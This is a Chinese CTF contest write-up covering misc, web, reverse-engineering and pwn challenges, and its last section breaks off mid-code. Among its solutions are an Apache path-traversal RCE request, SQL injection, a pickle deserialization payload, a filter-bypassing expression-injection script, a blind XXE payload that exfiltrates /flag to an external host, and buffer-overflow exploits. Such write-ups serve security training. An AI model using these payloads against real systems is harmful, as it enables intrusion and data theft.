---
title: 2024年首届高校网络安全管理运维赛Writeup
url: https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247505947&idx=1&sn=0f2b8667ef48975bbed7354826a6bfbf&chksm=fa520da5cd2584b300f644654f0261586c533facec0692b7c94cad40cb733a585f5dfb5483fa&scene=58&subscene=0#rd
source: 山石网科安全技术研究院
date: 2024-05-09
fetch_date: 2025-10-06T17:17:24.891187
---

# 2024年首届高校网络安全管理运维赛Writeup

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBAc9ficL6Bo0hmq8aD6tnX1DHsXSlO1VKdKVxad6Pl266ibRyK18hTmKg/0?wx_fmt=jpeg)

# 2024年首届高校网络安全管理运维赛Writeup

原创

NEURON

山石网科安全技术研究院

# Misc

## 签到

得到gif图片，分离gif，得到synt{fvtava-dhvm-jryy-qbar}

再根据图片提示，rot13⼀下得到flag

## 钓鱼邮箱识别

### Flag1

base64解密发件人得到flag

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBhcTj4WtqUTNicXr8y3S3B5jfoAPDqw6DhOeO6KcHZ7E2RcGesJ3V72g/640?wx_fmt=png&from=appmsg)

### Flag2

Base64解密邮箱内容得到flag

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBggTTF6J0jPpZQQLcMhkujnpavia8lzDm5Wljgy6KibsY4PtRM5bJNT8w/640?wx_fmt=png&from=appmsg)

### Flag3

通过VirusTotal查发件人域名`foobar-edu-cn.com`，发现提示

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBicjeWdvnKmJWv9ia53DgGQYqlrlgmicRhM9wb5BB6vicHtkoxOIOWUFia6w/640?wx_fmt=png&from=appmsg)

根据上面的提示想到邮箱的SPF、DKIM 和 DMARC身份认证协议

SPF

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBGJaMsIq16HwIXEQhgNeG2DFibOibwODFYhVRBqzG08wo2c9FuErqaibPQ/640?wx_fmt=png&from=appmsg)

DKIM、DMARC(https://dnsspy.io/scan/foobar-edu-cn.com)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBgpfib30ibtRvqgVHgdDBibTzKWp8W7gIVpBpRbic8OuPv1vTcRN2U3wKPA/640?wx_fmt=png&from=appmsg)

## easyshell

过滤http流，发现冰蝎流量，使⽤冰蝎默认密钥 e45e329feb5d925b ，在倒数第二个解密，发现在读取secret.txt ⽂件，继续解密流量找到压缩包

发现crc值相同使用明文攻击，得到密码`A8s123/+*`

解压后得到flag

## SecretDB

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBo5wiaah5LdLHfqzxq86XsyynlLt9dfT0RmqG5ZGxvGB4wGEh6iaTvA6g/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBsyKVafhkmoYA8MwTgDKGZibcrQk8XcXZiaYXE2Mbib7LRMEFocLoZWFEg/640?wx_fmt=png&from=appmsg)

根据sqlite文件格式解析，提取索引和值

## Gateway

在json文件中，发现配置信息

github上有直接的解密脚本，python直接调用

```
def passwd_decode(code) -> str:
 passwd_list = map(int, code.split('&'))
 result=[]
 for i in passwd_list:
  if 97 <= i <= 100 or 65 <= i <= 68:
   i += 22
  elif i > 57:
   i -= 4
  result.append(chr(i))
  #print(i, chr(i))
 return (''.join(result))
print(passwd_decode("106&112&101&107&127&101&104&49&57&56&53&56&54&56&49&51&51&105&56
&103&106&49&56&50&56&103&102&56&52&101&104&102&105&53&101&53&102&129"))
 # flag{ad1985868133e8cf1828cb84adbe5a5b}
```

## zip

输入token，使用\x15定位到flag

## Apache

题目给出了源码，/nc路由提供了于靶机连接的通道，根据docker和httpd.conf的信息，apache 2.4.49存在

路径穿越漏洞，开放在80端口，结合cgi-bin。可直接造成rce

```
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 20
Connection: close

echo;cat /fl*;

# urlencode

/nc

post body: port=80&data=[urlencode_data]
```

## f or r

网上发现原题，

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBm3Ng8o5aiaPq2IQEiaREiautpK6Dxsm32OCGGwRKF4UeLufIRhAQGulfA/640?wx_fmt=png&from=appmsg)

# Web

## phpsql

万能密码, 登录即可得到flag

```
admin
1'||'
```

## pyssrf

python3.7 的urlopen函数有crlf漏洞

crlf去直接打redis设置key和value，这里pickle反序列化即可

https://bugs.python.org/issue42987

这里不出网，所以打报错的opcode。

```
from base64 import b64encode
from urllib.parse import quote

def base64_encode(s: str, encoding='utf-8') -> str:
    return b64encode(s.encode()).decode(encoding=encoding)

exc = "raise Exception(__import__('os').popen('cat /fl*').read())"
exc = base64_encode(exc).encode()

opcode = b'''cconfig
notadmin
(S'admin'
S'yes'
u0(cconfig
backdoor
(S'exec(__import__("base64").b64decode(b"%s"))'
lo.''' % (exc)

print(quote(b64encode(opcode).decode())
```

## Messy Mongo

代码审计发现，最终的漏洞点在`/api/login`.使用PATCH方法修改用户名为admin,这里用$toString 操作来绕过, 如下：

```
{
"username":{
"$toString":"admin"
}
}
```

## expr

表达式注入，公告说了不出网，过滤了 java.和exec，使用盲注来猜取flag

POC如下：

```
new javax.script.ScriptEngineManager().getEngineByName("JS").eval('a=(new ja'+'va.lang.String(jav'+'a.nio.file.Files.readAllBytes(ja'+'va.nio.file.Paths.get("/flag"))).contains("[Alphabet]"))?x:0')
```

脚本：

```
import requests
url = ""
def istext(text):
 data = {"expr": '''new javax.script.ScriptEngineManager().getEngineByName("JS").eval('a=(new ja'+'va.lang.String(jav'+'a.nio.file.Files.readAllBytes(ja'+'va.nio.file.Paths.get("/flag"))).contains("''' + text + '''"))?x:0')'''}
 return len(requests.post(url,data).text) == 105
flag = "flag{"
for i in range(100):
 for j in "_0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ}":
  if istext(flag + j):
   flag += j
   print(flag)
   break
  if j == "~":
   exit(1)
```

## fileit

Blind XXE

```
<?xml version="1.0" ?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://[IP]/tmp.dtd">
%sp;
%param1;
]>
<r>&exfil;</r>

# File stored on http://[IP]/tmp.dtd

<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://[IP]/tmp.xml?
file=%data;'>">
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwB5MNVbvuLjZBQNdT6l30b7ibdGibohEHxBWftEEqyYJYqCF4q9mltJBFQ/640?wx_fmt=png&from=appmsg)

# Reverse

## easyre

base64魔改编码表

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBbPXYHTO3xBGXPmv9hzibMibAlOqyXgAibC1qV26tYFWBvKjj1ntyczzew/640?wx_fmt=png&from=appmsg)

## babyre

upx脱壳

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwBLOxHBfRcWYPb2CA45qRSzVePHJFLqF6icI0EibWDl03TQJCCpibQwcKIw/640?wx_fmt=png&from=appmsg)

4段校验

```
from z3 import *

# 求解a1
a1 = 0xADB1D018 + 0x36145344
print(hex(a1))
a1 = 0xe3c6235c

# 求解a2
a2 = BitVec('a2', 32)
s = Solver()
s.add((a2 | 0x8E03BEC3) - 3 * (a2 & 0x71FC413C) + a2 == -1876131848)

if s.check() == sat:
    m = s.model()
    solution = m[a2].as_long()
    print(hex(solution))
a2 = 0x05d9434d

# 求解a3
a3 = BitVec('a3', 32)
s = Solver()
s.add(a3 < 0x10000000)
s.add(4*((~a3&0xA8453437)+2*~(~a3|0xA8453437))+-3*(~a3|0xA8453437)+3*~(a3|0xA8453437)-(-10*(a3&0xA8453437)+(a3^0xA8453437))==551387557)
if s.check() == sat:
    m = s.model()
    solution = m[a3].as_long()
    print(hex(solution))
a2 = 0x04b1edf3

# 求解a4
a4 = BitVec('a4', 32)
s = Solver()
s.add(a4<0x10000000)
# s.add(a4 < 0x84034083)  # 0xf4034083 0xc4034083 0x84034083
s.add(11*~(a4^0xE33B67BD)+4*~(~a4|0xE33B67BD)-(6*(a4&0xE33B67BD)+12*~(a4|0xE33B67BD))+3*(a4&0xD2C7FC0C)+(-5)*a4-(2*~(a4|0xD2C7FC0C))+(~(a4|0x2D3803F3))+(4*(a4&0x2D3803F3))-((-2)*(a4|0x2D3803F3))==(-837785892))
if s.check() == sat:
    m = s.model()
    solution = m[a4].as_long()
    print(hex(solution))
a4 = 0x04034083

#flag{e3c6235c-05d9434d-04b1edf3-04034083}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRXKiaMkrKMhmib6DHvKrhqwB32ANDooBs3gSlHLvkZMHzBzfX1dfOsJyu6BOOHPMfzRSwgSVRCB5OA/640?wx_fmt=png&from=appmsg)

# Pwn

## BabyPwn

```
from pwn import*
context(arch='amd64', os='linux',log_level="debug")

def get_p(name):
    global p,elf
    # p = process(name)
    p = remote("host",port)
    # elf = ELF(name)

get_p("./pwn")
backdoor = 0x040117A
payload = b"A"*0x38 + p64(backdoor)

p.sendlineafter("token","[token]")
p.sendafter("Enter",b"hacker")
p.sendafter("Enter",payload)
# gdb.attach(p,"")
p.interactive()
```

## Login

Password有溢出，发现很多字节，猜测是个ELF文件

```
p.recvuntil("ed")
p.recv(1)
for i in range(0x10):
 data = p.recv(0x1000)
 if data == 0:
  break
 else:
  with open('output', 'a', encoding='latin-1') as file:
   file.write(data.decode('latin-1'))
```

接收一下，把文件导出来发现确实是ELF文件。有后门函数，直接ret2text

```
from pwn import *
p = remote('prob03.contest.pku.edu.cn:10004')
p.sendlineafter("Please input your token: ","[token]")
p.sendlineafter("Username: ","admin\n")
debug(p,0x401431)
payload=b"admin\n"
payload+=b'1q2w3e4r'
payload=payload.ljust(0x9e,b'b')
payload+=p64(0x40127E)
p.sendlineafter("Password: ",payload)
p.interactive()
```

# AI

## secretbit

exp如下

```
from random import shuffle
from tqdm import tqdm
from Crypto.Util.number import *
def instance(m, n):
    start = list(range(m))
    shuffle(start)
    for i in range(m):
        now = start[i]
        this_turn = False
        for j in range(n-1):
            if now == i:
                this_turn = True
    ...